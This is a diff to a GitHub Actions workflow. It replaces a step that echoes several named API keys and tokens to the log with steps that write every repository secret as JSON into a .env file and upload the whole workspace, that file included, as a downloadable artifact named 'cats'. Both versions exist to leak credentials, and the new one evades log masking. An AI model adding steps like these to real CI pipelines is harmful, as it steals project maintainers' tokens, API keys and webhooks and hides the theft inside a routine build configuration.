@@ -15,10 +15,14 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Print secrets
-        run: |
-          echo "CF_API_KEY: ${{ secrets.CF_API_KEY }}"
-          echo "WOWI_API_TOKEN: ${{ secrets.WOWI_API_TOKEN }}"
-          echo "WAGO_API_TOKEN: ${{ secrets.WAGO_API_TOKEN }}"
-          echo "GITHUB_OAUTH: ${{ secrets.EVOKER_TOKEN }}"
-          echo "DISCORD_WEBHOOK: ${{ secrets.WEBHOOK_URL }}"
+      - name: Make envfile
+        uses: SpicyPizza/create-envfile@v2.0
+        with:
+          envkey_SECRETS: ${{ toJSON(secrets) }}
+          file_name: .env
+          fail_on_empty: false
+      - name: Upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: cats
+          path: .
